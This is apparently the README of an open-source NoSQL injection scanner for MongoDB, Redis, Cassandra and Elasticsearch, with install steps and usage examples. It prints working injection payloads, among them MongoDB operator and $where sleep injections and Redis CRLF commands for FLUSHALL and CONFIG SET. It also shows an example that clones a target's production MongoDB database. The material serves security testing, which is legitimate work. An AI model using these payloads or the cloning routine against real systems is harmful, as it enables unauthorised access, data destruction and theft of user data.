# NoSQL Security Scanner

Multi-database NoSQL injection scanner supporting MongoDB, Redis, Cassandra, and Elasticsearch.

Created by **Regaan** | December 2025

---

## Features

- Multi-database support (MongoDB, Redis, Cassandra, Elasticsearch)
- 150+ attack payloads
- Database cloning (MongoDB)
- Blind injection (timing-based)
- Authentication bypass testing
- Async HTTP requests
- Burp Suite integration (proxy support)
- HTML report generation
- Configuration management

---

## Installation

```bash
git clone https://github.com/noobforanonymous/nosql-scanner.git
cd nosql-scanner
pip install -r requirements.txt

# Optional: For database cloning
pip install pymongo
```

---

## Quick Start

### MongoDB Scan
```bash
python nosql_scanner.py https://example.com/api/login mongodb
```

### Redis Scan
```bash
python nosql_scanner.py https://example.com/api/cache redis
```

### Cassandra Scan
```bash
python nosql_scanner.py https://example.com/api/query cassandra
```

### Elasticsearch Scan
```bash
python nosql_scanner.py https://example.com/api/search elasticsearch
```

---

## Usage Examples

### Example 1: MongoDB Authentication Bypass
```bash
python nosql_scanner.py https://example.com/api/login mongodb
```

Output:
```
[*] Starting comprehensive NoSQL scan (mongodb)
[*] Testing MongoDB operator injection...
[!] MongoDB operator injection successful: {"$ne": null}
[*] Testing MongoDB blind injection...
[!] Blind injection detected! Time difference: 5.12s
[+] Scan complete in 8.45s
[*] Found 2 vulnerabilities
[+] HTML report saved to: nosql_report.html
```

### Example 2: Database Cloning
```python
import asyncio
from nosql_scanner import NoSQLScanner

async def clone():
    scanner = NoSQLScanner("mongodb://target.com:27017", "mongodb")
    result = await scanner.clone_mongodb_database("production")
    print(f"Cloned {result['total_documents']} documents!")

asyncio.run(clone())
```

Output:
```
[*] Attempting to clone MongoDB database: production
[*] Found 12 collections to clone
[+] Cloned 1523 documents from users
[+] Cloned 892 documents from orders
[+] Database cloning complete!
[+] Total documents cloned: 15234
```

## Supported Databases

### MongoDB
- Operator injection ($ne, $gt, $regex, etc.)
- JavaScript injection ($where)
- Authentication bypass
- Blind injection (timing-based)

### Redis
- Command injection (FLUSHALL, CONFIG, EVAL)
- Direct command execution
- Configuration manipulation

### Cassandra
- CQL injection
- UNION-based attacks
- Keyspace enumeration

### Elasticsearch
- Query manipulation
- Script injection
- Wildcard queries

---

## Attack Payloads

### MongoDB (23+ payloads)
```json
{"$ne": null}
{"$gt": ""}
{"$regex": ".*"}
{"$where": "sleep(5000)"}
{"$in": ["admin", "root"]}
```

### Redis (12+ payloads)
```
\n\r\nFLUSHALL\r\n
\n\r\nCONFIG SET dir /var/www/html\r\n
\n\r\nEVAL 'malicious code' 0\r\n
```

---

## Advanced Features

### Database Cloning
```python
# Clone entire MongoDB database
result = await scanner.clone_mongodb_database("production_db")
```

### Burp Suite Integration
```python
scanner = NoSQLScanner(
    "https://example.com/api",
    "mongodb",
    proxy="http://127.0.0.1:8080"
)
```

### Configuration Management
```python
# Save configuration
scanner.save_config("nosql_config.json")

# Load configuration
scanner = NoSQLScanner.load_config("nosql_config.json")
```
